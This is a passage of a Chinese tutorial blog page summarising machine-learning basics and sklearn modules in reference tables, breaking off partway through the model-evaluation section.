<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>机器学习-基础知识、sklearn库、评估指标、python数据处理库 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">机器学习-基础知识、sklearn库、评估指标、python数据处理库</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    
                        
                    
                    <p></p>
<div class="toc">
 <h3>文章目录</h3>
 <ul><li>
<ul>
<li><a href="#1__1">1. 机器学习基本概念</a></li>
<li>
<ul>
<li><a href="#11__3">1.1. 常用算法</a></li>
<li><a href="#12__15">1.2. 基本概念</a></li>
<li><a href="#13__28">1.3. 机器学习步骤框架</a></li>
<li><a href="#14__34">1.4. 机器学习中分类和预测算法的评估</a></li>
<li><a href="#15__42">1.5. 分类与回归问题</a></li>
</ul>
   </li>
<li><a href="#2_sklearn_46">2. sklearn机器学习库</a></li>
<li>
<ul>
<li><a href="#21__48">2.1. 定义</a></li>
<li><a href="#22_sklearn_64">2.2. sklearn数据类型</a></li>
<li><a href="#23_sklearn_68">2.3. sklearn总览</a></li>
<li>
<ul>
<li><a href="#231__73">2.3.1. 数据预处理</a></li>
<li><a href="#232__117">2.3.2. 数据集</a></li>
<li><a href="#233__160">2.3.3. 特征选择</a></li>
<li><a href="#234__174">2.3.4. 特征降维</a></li>
<li><a href="#235__207">2.3.5. 模型构建</a></li>
<li>
<ul>
<li><a href="#1_209">（1）分类模型</a></li>
<li><a href="#2_279">（2）回归模型</a></li>
<li><a href="#3_351">（3）聚类模型</a></li>
</ul>
     </li>
<li><a href="#236__382">2.3.6. 模型评估</a></li>
<li><a href="#237__414">2.3.7. 模型优化</a></li>
</ul>
   </li>
</ul>
   </li>
<li><a href="#3__428">3. 评估指标</a></li>
<li>
<ul>
<li><a href="#31__430">3.1. 各种算法的评估指标</a></li>
<li><a href="#32__434">3.2. 分类任务</a></li>
<li><a href="#33__655">3.3. 回归任务</a></li>
<li><a href="#34__711">3.4. 无监督任务</a></li>
</ul>
   </li>
<li><a href="#4_python_738">4. 机器学习用到的python库</a></li>
<li>
<ul>
<li><a href="#41_Numpy_740">4.1. Numpy</a></li>
<li><a href="#42_Pandas_772">4.2. Pandas</a></li>
<li><a href="#43_Matplotlib_780">4.3. Matplotlib</a></li>
</ul>
  </li>
</ul>
 </li></ul>
</div>
<p></p> 
<h2>
<a id="1__1"></a>1. 机器学习基本概念</h2> 
<h3>
<a id="11__3"></a>1.1. 常用算法</h3> 
<ul>
<li>线性回归（<strong>Linear Regression</strong>）</li>
<li>逻辑回归（<strong>Logistic Regression</strong>）</li>
<li>聚类（<strong>k-means</strong>，<strong>DBSCAN</strong>）</li>
<li>决策树（<strong>Decision Tree</strong>）</li>
<li>集成算法（<strong>Random forest</strong> ，<strong>AdaBoost</strong>，<strong>Gradient Boosting</strong>）</li>
<li>支持向量机（<strong>Support Vector Machine</strong>）</li>
<li>k近邻（<strong>K-Nearest Neighbors</strong>）</li>
<li>线性判别分析（<strong>Linear Discriminant Analysis</strong>）</li>
<li>朴素贝叶斯（<strong>Bayes Theorem</strong>）</li>
</ul> 
<h3>
<a id="12__15"></a>1.2. 基本概念</h3> 
<ul>
<li> <p><strong>训练集</strong>：又称训练样例，用来进行训练，也就是产生模型或者算法的数据集</p> </li>
<li> <p><strong>测试集</strong>：又称测试样例，用来专门进行测试已经学习好的模型或者算法的数据集</p> </li>
<li> <p><strong>特征值</strong>：属性的集合，通常用一个向量来表示，附属于一个实例</p> </li>
<li> <p><strong>标记</strong>：实例类别的标记（正例与反例或者更多）</p> </li>
<li> <p><strong>分类</strong>：目标标记为<code>类别型</code>数据</p> </li>
<li> <p><strong>回归</strong>：目标标记为<code>连续型</code>数值</p> </li>
<li> <p><strong>有监督学习</strong>：训练集有类别标记</p> </li>
<li> <p><strong>无监督学习</strong>：训练集无类别标记</p> </li>
<li> <p><strong>半监督学习</strong>：训练集既有有类别标记又有无类别标记</p> </li>
</ul> 
<h3>
<a id="13__28"></a>1.3. 机器学习步骤框架</h3> 
<ol>
<li>把数据拆分为训练集和测试集</li>
<li>用训练集和训练集的特征向量来训练算法</li>
<li>用学习来的算法运用在测试集上来评估算法(可能要涉及到调整参数，用验证集)</li>
</ol> 
<h3>
<a id="14__34"></a>1.4. 机器学习中分类和预测算法的评估</h3> 
<ul>
<li>准确性</li>
<li>速度</li>
<li>强壮性</li>
<li>可规模性</li>
<li>可解释性</li>
</ul> 
<h3>
<a id="15__42"></a>1.5. 分类与回归问题</h3> 
<p><img src="https://images2.imgbox.com/11/b8/SzkutGJm_o.png" alt="在这里插入图片描述" width="650"></p> 
<h2>
<a id="2_sklearn_46"></a>2. sklearn机器学习库</h2> 
<h3>
<a id="21__48"></a>2.1. 定义</h3> 
<ul><li> <p><strong>简介</strong>：sklearn是基于python语言的机器学习工具包，是目前做机器学习项目当之无愧的第一工具。 sklearn自带了大量的数据集，可供我们练习各种机器学习算法。 sklearn集成了数据预处理、数据特征选择、数据特征降维、分类回归聚类模型、模型评估等非常全面算法。</p> <p><strong>分类</strong>：识别某个对象属于哪个类别，常用的算法有：SVM（支持向量机）,nearest neighbors（最近邻）、random forest（随机森林）</p> <p><strong>回归</strong>：预测与对象相关联的连续值属性，常用算法：SVR(支持向量机)， ridge regression(岭回归)、Lasso</p> <p><strong>聚类</strong>：将相似对象自动分组，常用算法： k-Means、 spectral clustering、mean-shift</p> <p><strong>降维</strong>：减少要考虑的随机变量的数量，PCA(主成分分析)， eature selection(特征选择)、non-negative matrix factorization(非负矩阵分解)</p> <p><strong>模型选择</strong>：比较，验证，选择参数和模型，常用的模块有：grid search(网格搜索)、cross validation(交叉验证)、 metrics(度量)</p> <p><strong>预处理</strong>：特征提取和归一化，把输入的数据转换为机器学习算法可用的数据</p> </li></ul> 
<h3>
<a id="22_sklearn_64"></a>2.2. sklearn数据类型</h3> 
<p>机器学习最终处理的数据都是数字，只不过这些数据可能以不同的形态被呈现出来，如矩阵、文字、图片、视频、音频等。</p> 
<h3>
<a id="23_sklearn_68"></a>2.3. sklearn总览</h3> 
<p><img src="https://images2.imgbox.com/43/f2/a9AQVBP5_o.png" alt="在这里插入图片描述" width="500"></p> 
<h4>
<a id="231__73"></a>2.3.1. 数据预处理</h4> 
<p><img src="https://images2.imgbox.com/9e/c9/p72kISYh_o.png" alt="在这里插入图片描述" width="850"></p> 
<ul>
<li> <p><strong>sklearn.preprocessing</strong></p> 
  <table>
<thead><tr>
<th align="left"><strong>函数</strong></th>
<th align="left"><strong>功能</strong></th>
</tr></thead>
<tbody>
<tr>
<td align="left">preprocessing.scale( )</td>
<td align="left">标准化</td>
</tr>
<tr>
<td align="left">preprocessing.MinMaxScaler( )</td>
<td align="left">最大最小值标准化</td>
</tr>
<tr>
<td align="left">preprocessing.StandardScaler( )</td>
<td align="left">数据标准化</td>
</tr>
<tr>
<td align="left">preprocessing.MaxAbsScaler( )</td>
<td align="left">绝对值最大标准化</td>
</tr>
<tr>
<td align="left">preprocessing.RobustScaler( )</td>
<td align="left">带离群值数据集标准化</td>
</tr>
<tr>
<td align="left">preprocessing.QuantileTransformer( )</td>
<td align="left">使用分位数信息变换特征</td>
</tr>
<tr>
<td align="left">preprocessing.PowerTransformer( )</td>
<td align="left">使用幂变换执行到正态分布的映射</td>
</tr>
<tr>
<td align="left">preprocessing.Normalizer( )</td>
<td align="left">正则化</td>
</tr>
<tr>
<td align="left">preprocessing.OrdinalEncoder( )</td>
<td align="left">将分类特征转换为分类数值</td>
</tr>
<tr>
<td align="left">preprocessing.LabelEncoder( )</td>
<td align="left">将分类特征转换为分类数值</td>
</tr>
<tr>
<td align="left">preprocessing.MultiLabelBinarizer( )</td>
<td align="left">多标签二值化</td>
</tr>
<tr>
<td align="left">preprocessing.OneHotEncoder( )</td>
<td align="left">独热编码</td>
</tr>
<tr>
<td align="left">preprocessing.KBinsDiscretizer( )</td>
<td align="left">将连续数据离散化</td>
</tr>
<tr>
<td align="left">preprocessing.FunctionTransformer( )</td>
<td align="left">自定义特征处理函数</td>
</tr>
<tr>
<td align="left">preprocessing.Binarizer( )</td>
<td align="left">特征二值化</td>
</tr>
<tr>
<td align="left">preprocessing.PolynomialFeatures( )</td>
<td align="left">创建多项式特征</td>
</tr>
<tr>
<td align="left">preprocesssing.Normalizer( )</td>
<td align="left">正则化</td>
</tr>
<tr>
<td align="left">preprocessing.Imputer( )</td>
<td align="left">弥补缺失值</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>sklearn.svm</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">介绍</th>
</tr></thead>
<tbody><tr>
<td align="left">svm.OneClassSVM( )</td>
<td align="left">无监督异常值检测</td>
</tr></tbody>
</table>
<p>上述preprocessing类函数的方法如下：</p> 
  <table>
<thead><tr>
<th align="left">函数方法</th>
<th align="left">介绍</th>
</tr></thead>
<tbody>
<tr>
<td align="left">xxx.fit( )</td>
<td align="left">拟合数据</td>
</tr>
<tr>
<td align="left">xxx.fit_transform( )</td>
<td align="left">拟合并转换数据</td>
</tr>
<tr>
<td align="left">xxx.get_params( )</td>
<td align="left">获取函数参数</td>
</tr>
<tr>
<td align="left">xxx.inverse_transform( )</td>
<td align="left">逆转换</td>
</tr>
<tr>
<td align="left">xxx.set_params( )</td>
<td align="left">设置参数</td>
</tr>
<tr>
<td align="left">xxx.transform( )</td>
<td align="left">转换数据</td>
</tr>
</tbody>
</table>
</li>
</ul> 
<h4>
<a id="232__117"></a>2.3.2. 数据集</h4> 
<p><img src="https://images2.imgbox.com/55/75/jxXTQeMx_o.png" alt="在这里插入图片描述" width="750"></p> 
<ul><li><strong>sklearn.datasets</strong></li></ul> 
<ol>
<li> <p>获取小数据集(本地加载)：<code>datasets.load_xxx()</code></p> </li>
<li> <p>获取大数据集(在线下载)：<code>datasets.fetch_xxx()</code></p> </li>
<li> <p>本地生成数据集(本地构造)：<code>datasets.make_xxx()</code></p> 
  <table>
<thead><tr>
<th align="left">数据集</th>
<th align="left">介绍</th>
</tr></thead>
<tbody>
<tr>
<td align="left">load_iris( )</td>
<td align="left">鸢尾花数据集：3类、4个特征、150个样本</td>
</tr>
<tr>
<td align="left">load_boston( )</td>
<td align="left">波斯顿房价数据集：13个特征、506个样本</td>
</tr>
<tr>
<td align="left">load_digits( )</td>
<td align="left">手写数字集：10类、64个特征、1797个样本</td>
</tr>
<tr>
<td align="left">load_breast_cancer( )</td>
<td align="left">乳腺癌数据集：2类、30个特征、569个样本</td>
</tr>
<tr>
<td align="left">load_diabets( )</td>
<td align="left">糖尿病数据集：10个特征、442个样本</td>
</tr>
<tr>
<td align="left">load_wine( )</td>
<td align="left">红酒数据集：3类、13个特征、178个样本</td>
</tr>
<tr>
<td align="left">load_files( )</td>
<td align="left">加载自定义的文本分类数据集</td>
</tr>
<tr>
<td align="left">load_linnerud( )</td>
<td align="left">体能训练数据集：3个特征、20个样本</td>
</tr>
<tr>
<td align="left">load_sample_image( )</td>
<td align="left">加载单个图像样本</td>
</tr>
<tr>
<td align="left">load_svmlight_file( )</td>
<td align="left">加载svmlight格式的数据</td>
</tr>
<tr>
<td align="left">make_blobs( )</td>
<td align="left">生成多类单标签数据集</td>
</tr>
<tr>
<td align="left">make_biclusters( )</td>
<td align="left">生成双聚类数据集</td>
</tr>
<tr>
<td align="left">make_checkerboard( )</td>
<td align="left">生成棋盘结构数组，进行双聚类</td>
</tr>
<tr>
<td align="left">make_circles( )</td>
<td align="left">生成二维二元分类数据集</td>
</tr>
<tr>
<td align="left">make_classification( )</td>
<td align="left">生成多类单标签数据集</td>
</tr>
<tr>
<td align="left">make_friedman1( )</td>
<td align="left">生成采用了多项式和正弦变换的数据集</td>
</tr>
<tr>
<td align="left">make_gaussian_quantiles( )</td>
<td align="left">生成高斯分布数据集</td>
</tr>
<tr>
<td align="left">make_hastie_10_2( )</td>
<td align="left">生成10维度的二元分类数据集</td>
</tr>
<tr>
<td align="left">make_low_rank_matrix( )</td>
<td align="left">生成具有钟形奇异值的低阶矩阵</td>
</tr>
<tr>
<td align="left">make_moons( )</td>
<td align="left">生成二维二元分类数据集</td>
</tr>
<tr>
<td align="left">make_multilabel_classification( )</td>
<td align="left">生成多类多标签数据集</td>
</tr>
<tr>
<td align="left">make_regression( )</td>
<td align="left">生成回归任务的数据集</td>
</tr>
<tr>
<td align="left">make_s_curve( )</td>
<td align="left">生成S型曲线数据集</td>
</tr>
<tr>
<td align="left">make_sparse_coded_signal( )</td>
<td align="left">生成信号作为字典元素的稀疏组合</td>
</tr>
<tr>
<td align="left">make_sparse_spd_matrix( )</td>
<td align="left">生成稀疏堆成的正定矩阵</td>
</tr>
<tr>
<td align="left">make_sparse_uncorrelated( )</td>
<td align="left">使用稀疏的不相关设计生成随机回归问题</td>
</tr>
<tr>
<td align="left">make_spd_matrix( )</td>
<td align="left">生成随机堆成的正定矩阵</td>
</tr>
<tr>
<td align="left">make_swiss_roll( )</td>
<td align="left">生成瑞士卷曲线数据集</td>
</tr>
</tbody>
</table>
</li>
</ol> 
<h4>
<a id="233__160"></a>2.3.3. 特征选择</h4> 
<p><img src="https://images2.imgbox.com/45/c9/nrUmidhs_o.png" alt="在这里插入图片描述" width="800"></p> 
<ul><li> <p><strong>sklean.feature_selection</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">feature_selection.SelectKBest( ) feature_selection.chi2 ( )feature_selection.f_regression( ) feature_selection.mutual_info_regression( )</td>
<td align="left">选择K个得分最高的特征</td>
</tr>
<tr>
<td align="left">feature_selection.VarianceThreshold( )</td>
<td align="left">无监督特征选择</td>
</tr>
<tr>
<td align="left">feature_selection.REF( )</td>
<td align="left">递归式特征消除</td>
</tr>
<tr>
<td align="left">feature_selection.REFCV( )</td>
<td align="left">递归式特征消除交叉验证法</td>
</tr>
<tr>
<td align="left">feature_selection.SelectFromModel( )</td>
<td align="left">特征选择</td>
</tr>
</tbody>
</table>
</li></ul> 
<h4>
<a id="234__174"></a>2.3.4. 特征降维</h4> 
<p><img src="https://images2.imgbox.com/a1/b9/HzDfgnSa_o.png" alt="在这里插入图片描述" width="700"></p> 
<ul>
<li> <p><strong>sklearn.decomposition</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">decomposition.PCA( )</td>
<td align="left">主成分分析</td>
</tr>
<tr>
<td align="left">decomposition.KernelPCA( )</td>
<td align="left">核主成分分析</td>
</tr>
<tr>
<td align="left">decomposition.IncrementalPCA( )</td>
<td align="left">增量主成分分析</td>
</tr>
<tr>
<td align="left">decomposition.MiniBatchSparsePCA( )</td>
<td align="left">小批量稀疏主成分分析</td>
</tr>
<tr>
<td align="left">decomposition.SparsePCA( )</td>
<td align="left">稀疏主成分分析</td>
</tr>
<tr>
<td align="left">decomposition.FactorAnalysis( )</td>
<td align="left">因子分析</td>
</tr>
<tr>
<td align="left">decomposition.TruncatedSVD( )</td>
<td align="left">截断的奇异值分解</td>
</tr>
<tr>
<td align="left">decomposition.FastICA( )</td>
<td align="left">独立成分分析的快速算法</td>
</tr>
<tr>
<td align="left">decomposition.DictionaryLearning( )</td>
<td align="left">字典学习</td>
</tr>
<tr>
<td align="left">decomposition.MiniBatchDictonaryLearning( )</td>
<td align="left">小批量字典学习</td>
</tr>
<tr>
<td align="left">decomposition.dict_learning( )</td>
<td align="left">字典学习用于矩阵分解</td>
</tr>
<tr>
<td align="left">decomposition.dict_learning_online( )</td>
<td align="left">在线字典学习用于矩阵分解</td>
</tr>
<tr>
<td align="left">decomposition.LatentDirichletAllocation( )</td>
<td align="left">在线变分贝叶斯算法的隐含迪利克雷分布</td>
</tr>
<tr>
<td align="left">decomposition.NMF( )</td>
<td align="left">非负矩阵分解</td>
</tr>
<tr>
<td align="left">decomposition.SparseCoder( )</td>
<td align="left">稀疏编码</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>sklearn.manifold</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">manifold.LocallyLinearEmbedding( )</td>
<td align="left">局部非线性嵌入</td>
</tr>
<tr>
<td align="left">manifold.Isomap( )</td>
<td align="left">流形学习</td>
</tr>
<tr>
<td align="left">manifold.MDS( )</td>
<td align="left">多维标度法</td>
</tr>
<tr>
<td align="left">manifold.t-SNE( )</td>
<td align="left">t分布随机邻域嵌入</td>
</tr>
<tr>
<td align="left">manifold.SpectralEmbedding( )</td>
<td align="left">频谱嵌入非线性降维</td>
</tr>
</tbody>
</table>
</li>
</ul> 
<h4>
<a id="235__207"></a>2.3.5. 模型构建</h4> 
<h5>
<a id="1_209"></a>（1）分类模型</h5> 
<p><img src="https://images2.imgbox.com/7b/ef/OddSqIrz_o.png" alt="在这里插入图片描述" width="800"></p> 
<ul>
<li> <p><strong>sklearn.tree</strong></p> 
  <table>
<thead><tr>
<th>函数</th>
<th>功能</th>
</tr></thead>
<tbody><tr>
<td>tree.DecisionTreeClassifier()</td>
<td>决策树</td>
</tr></tbody>
</table>
</li>
<li> <p><strong>sklearn.ensemble</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">ensemble.BaggingClassifier()</td>
<td align="left">装袋法集成学习</td>
</tr>
<tr>
<td align="left">ensemble.AdaBoostClassifier( )</td>
<td align="left">提升法集成学习</td>
</tr>
<tr>
<td align="left">ensemble.RandomForestClassifier( )</td>
<td align="left">随机森林分类</td>
</tr>
<tr>
<td align="left">ensemble.ExtraTreesClassifier( )</td>
<td align="left">极限随机树分类</td>
</tr>
<tr>
<td align="left">ensemble.RandomTreesEmbedding( )</td>
<td align="left">嵌入式完全随机树</td>
</tr>
<tr>
<td align="left">ensemble.GradientBoostingClassifier( )</td>
<td align="left">梯度提升树</td>
</tr>
<tr>
<td align="left">ensemble.VotingClassifier( )</td>
<td align="left">投票分类法</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>sklearn.linear_model</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">linear_model.LogisticRegression( )</td>
<td align="left">逻辑回归</td>
</tr>
<tr>
<td align="left">linear_model.Perceptron( )</td>
<td align="left">线性模型感知机</td>
</tr>
<tr>
<td align="left">linear_model.SGDClassifier( )</td>
<td align="left">具有SGD训练的线性分类器</td>
</tr>
<tr>
<td align="left">linear_model.PassiveAggressiveClassifier( )</td>
<td align="left">增量学习分类器</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>sklearn.svm</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">svm.SVC( )</td>
<td align="left">支持向量机分类</td>
</tr>
<tr>
<td align="left">svm.NuSVC( )</td>
<td align="left">Nu支持向量分类</td>
</tr>
<tr>
<td align="left">svm.LinearSVC( )</td>
<td align="left">线性支持向量分类</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>sklearn.neighbors</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">neighbors.NearestNeighbors( )</td>
<td align="left">无监督学习临近搜索</td>
</tr>
<tr>
<td align="left">neighbors.NearestCentroid( )</td>
<td align="left">最近质心分类器</td>
</tr>
<tr>
<td align="left">neighbors.KNeighborsClassifier()</td>
<td align="left">K近邻分类器</td>
</tr>
<tr>
<td align="left">neighbors.KDTree( )</td>
<td align="left">KD树搜索最近邻</td>
</tr>
<tr>
<td align="left">neighbors.KNeighborsTransformer( )</td>
<td align="left">数据转换为K个最近邻点的加权图</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>sklearn.discriminant_analysis</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">discriminant_analysis.LinearDiscriminantAnalysis( )</td>
<td align="left">线性判别分析</td>
</tr>
<tr>
<td align="left">discriminant_analysis.QuadraticDiscriminantAnalysis( )</td>
<td align="left">二次判别分析</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>sklearn.gaussian_process</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody><tr>
<td align="left">gaussian_process.GaussianProcessClassifier( )</td>
<td align="left">高斯过程分类</td>
</tr></tbody>
</table>
</li>
<li> <p><strong>sklearn.naive_bayes</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">naive_bayes.GaussianNB( )</td>
<td align="left">朴素贝叶斯</td>
</tr>
<tr>
<td align="left">naive_bayes.MultinomialNB( )</td>
<td align="left">多项式朴素贝叶斯</td>
</tr>
<tr>
<td align="left">naive_bayes.BernoulliNB( )</td>
<td align="left">伯努利朴素贝叶斯</td>
</tr>
</tbody>
</table>
</li>
</ul> 
<h5>
<a id="2_279"></a>（2）回归模型</h5> 
<p><img src="https://images2.imgbox.com/c5/e4/LTULb8VH_o.png" alt="在这里插入图片描述" width="650"></p> 
<ul>
<li> <p><strong>sklearn.tree</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">tree.DecisionTreeRegress( )</td>
<td align="left">回归决策树</td>
</tr>
<tr>
<td align="left">tree.ExtraTreeRegressor( )</td>
<td align="left">极限回归树</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>sklearn.ensemble</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">ensemble.GradientBoostingRegressor( )</td>
<td align="left">梯度提升法回归</td>
</tr>
<tr>
<td align="left">ensemble.AdaBoostRegressor( )</td>
<td align="left">提升法回归</td>
</tr>
<tr>
<td align="left">ensemble.BaggingRegressor( )</td>
<td align="left">装袋法回归</td>
</tr>
<tr>
<td align="left">ensemble.ExtraTreeRegressor( )</td>
<td align="left">极限树回归</td>
</tr>
<tr>
<td align="left">ensemble.RandomForestRegressor( )</td>
<td align="left">随机森林回归</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>sklearn.linear_model</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">linear_model.LinearRegression( )</td>
<td align="left">线性回归</td>
</tr>
<tr>
<td align="left">linear_model.Ridge( )</td>
<td align="left">岭回归</td>
</tr>
<tr>
<td align="left">linear_model.Lasso( )</td>
<td align="left">经L1训练后的正则化器</td>
</tr>
<tr>
<td align="left">linear_model.ElasticNet( )</td>
<td align="left">弹性网络</td>
</tr>
<tr>
<td align="left">linear_model.MultiTaskLasso( )</td>
<td align="left">多任务Lasso</td>
</tr>
<tr>
<td align="left">linear_model.MultiTaskElasticNet( )</td>
<td align="left">多任务弹性网络</td>
</tr>
<tr>
<td align="left">linear_model.Lars( )</td>
<td align="left">最小角回归</td>
</tr>
<tr>
<td align="left">linear_model.OrthogonalMatchingPursuit( )</td>
<td align="left">正交匹配追踪模型</td>
</tr>
<tr>
<td align="left">linear_model.BayesianRidge( )</td>
<td align="left">贝叶斯岭回归</td>
</tr>
<tr>
<td align="left">linear_model.ARDRegression( )</td>
<td align="left">贝叶斯ADA回归</td>
</tr>
<tr>
<td align="left">linear_model.SGDRegressor( )</td>
<td align="left">随机梯度下降回归</td>
</tr>
<tr>
<td align="left">linear_model.PassiveAggressiveRegressor( )</td>
<td align="left">增量学习回归</td>
</tr>
<tr>
<td align="left">linear_model.HuberRegression( )</td>
<td align="left">Huber回归</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>sklearn.svm</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">svm.SVR( )</td>
<td align="left">支持向量机回归</td>
</tr>
<tr>
<td align="left">svm.NuSVR( )</td>
<td align="left">Nu支持向量回归</td>
</tr>
<tr>
<td align="left">svm.LinearSVR( )</td>
<td align="left">线性支持向量回归</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>sklearn.neighbors</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">neighbors.KNeighborsRegressor( )</td>
<td align="left">K近邻回归</td>
</tr>
<tr>
<td align="left">neighbors.RadiusNeighborsRegressor( )</td>
<td align="left">基于半径的近邻回归</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>sklearn.kernel_ridge</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody><tr>
<td align="left">kernel_ridge.KernelRidge( )</td>
<td align="left">内核岭回归</td>
</tr></tbody>
</table>
</li>
<li> <p><strong>sklearn.gaussian_process</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody><tr>
<td align="left">gaussian_process.GaussianProcessRegressor( )</td>
<td align="left">高斯过程回归</td>
</tr></tbody>
</table>
</li>
<li> <p><strong>sklearn.cross_decomposition</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody><tr>
<td align="left">cross_decomposition.PLSRegression( )</td>
<td align="left">偏最小二乘回归</td>
</tr></tbody>
</table>
</li>
</ul> 
<h5>
<a id="3_351"></a>（3）聚类模型</h5> 
<p><img src="https://images2.imgbox.com/a8/be/GSDOzeic_o.png" alt="在这里插入图片描述" width="650"></p> 
<ul>
<li> <p><strong>sklearn.cluster</strong></p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">cluster.DBSCAN( )</td>
<td align="left">基于密度的聚类</td>
</tr>
<tr>
<td align="left">cluster.GaussianMixtureModel( )</td>
<td align="left">高斯混合模型</td>
</tr>
<tr>
<td align="left">cluster.AffinityPropagation( )</td>
<td align="left">吸引力传播聚类</td>
</tr>
<tr>
<td align="left">cluster.AgglomerativeClustering( )</td>
<td align="left">层次聚类</td>
</tr>
<tr>
<td align="left">cluster.Birch( )</td>
<td align="left">利用层次方法的平衡迭代聚类</td>
</tr>
<tr>
<td align="left">cluster.KMeans( )</td>
<td align="left">K均值聚类</td>
</tr>
<tr>
<td align="left">cluster.MiniBatchKMeans( )</td>
<td align="left">小批量K均值聚类</td>
</tr>
<tr>
<td align="left">cluster.MeanShift( )</td>
<td align="left">平均移位聚类</td>
</tr>
<tr>
<td align="left">cluster.OPTICS( )</td>
<td align="left">基于点排序来识别聚类结构</td>
</tr>
<tr>
<td align="left">cluster.SpectralClustering( )</td>
<td align="left">谱聚类</td>
</tr>
<tr>
<td align="left">cluster.Biclustering( )</td>
<td align="left">双聚类</td>
</tr>
<tr>
<td align="left">cluster.ward_tree( )</td>
<td align="left">集群病房树</td>
</tr>
</tbody>
</table>
</li>
<li> <p><strong>模型方法</strong></p> 
  <table>
<thead><tr>
<th align="left">方法</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">xxx.fit( )</td>
<td align="left">模型训练</td>
</tr>
<tr>
<td align="left">xxx.get_params( )</td>
<td align="left">获取模型参数</td>
</tr>
<tr>
<td align="left">xxx.predict( )</td>
<td align="left">预测新输入数据</td>
</tr>
<tr>
<td align="left">xxx.score( )</td>
<td align="left">评估模型分类/回归/聚类模型</td>
</tr>
<tr>
<td align="left">xxx.set_params( )</td>
<td align="left">设置模型参数</td>
</tr>
</tbody>
</table>
</li>
</ul> 
<h4>
<a id="236__382"></a>2.3.6. 模型评估</h4> 
<p><img src="https://images2.imgbox.com/53/39/8MehJTFI_o.png" alt="在这里插入图片描述" width="600"></p> 
<ul>
<li> <p>分类模型评估</p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">metrics.accuracy_score( )</td>
<td align="left">准确率</td>
</tr>
<tr>
<td align="left">metrics.average_precision_score( )</td>
<td align="left">平均准确率</td>
</tr>
<tr>
<td align="left">metrics.log_loss( )</td>
<td align="left">对数损失</td>
</tr>
<tr>
<td align="left">metrics.confusion_matrix( )</td>
<td align="left">混淆矩阵</td>
</tr>
<tr>
<td align="left">metrics.classification_report( )</td>
<td align="left">分类模型评估报告:准确率、召回率、F1-score</td>
</tr>
<tr>
<td align="left">metrics.roc_curve( )</td>
